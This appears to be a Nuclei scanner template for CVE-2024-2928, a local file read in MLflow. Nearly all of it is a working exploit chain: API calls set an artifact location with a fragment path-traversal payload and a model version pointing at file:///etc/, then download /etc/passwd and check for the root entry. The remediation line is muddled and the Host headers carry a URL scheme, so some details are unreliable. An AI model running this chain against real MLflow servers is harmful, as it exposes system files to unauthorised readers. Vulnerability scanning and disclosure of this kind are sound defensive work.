id: CVE-2024-2928

info:
  name: MLflow - LFI Exploitation
  author: jyjyjy25, gy741, oriing, ANseunghyeon, woo4826
  severity: high
  description: |
    This template detects Local File Read (LFI) vulnerabilities in MLflow due to URI fragment parsing confusion.
  impact: |
    Successful exploitation could allow an attacker to read arbitrary files such as /etc/passwd in the local file system.
  remediation: |
    Upgrade MLflow to version up to 2.11.3.
  reference:
    - https://huntr.com/bounties/19bf02d7-6393-4a95-b9d0-d6d4d2d8c298
    - https://nvd.nist.gov/vuln/detail/CVE-2024-2928
  tags: mlflow,lfi,cve,cve2024

http:
  - raw: 
    - |
      POST /ajax-api/2.0/mlflow/experiments/create HTTP/1.1
      Host: http://127.0.0.1:5000
      Content-Type: application/json

      {"name": "poc", "artifact_location": "http:\/\/\/#\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/"}
    
    extractors:
      - type: json
        part: experiment_id
  
  - raw:
    - |
      POST /api/2.0/mlflow/runs/create HTTP/1.1
      Host: http://127.0.0.1:5000
      Content-Type: application/json

      {"experiment_id": "{{experiment_id}}"}

    extractors:
      - type: json
        part: run.info.run_uuid

  - raw:
    - |
      POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1
      Host: http://127.0.0.1:5000
      Content-Type: application/json

      {"name": "poc"}

  - raw:
    - |
      POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
      Host: http://127.0.0.1:5000
      Content-Type: application/json

      {"name": "poc", "run_id": "{{run_id}}", "source": "file:///etc/"}

  - raw:
    - |
      GET /model-versions/get-artifact?path=passwd&name=poc&version=1 HTTP/1.1
      Host: http://127.0.0.1:5000
      Content-Type: application/json


    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"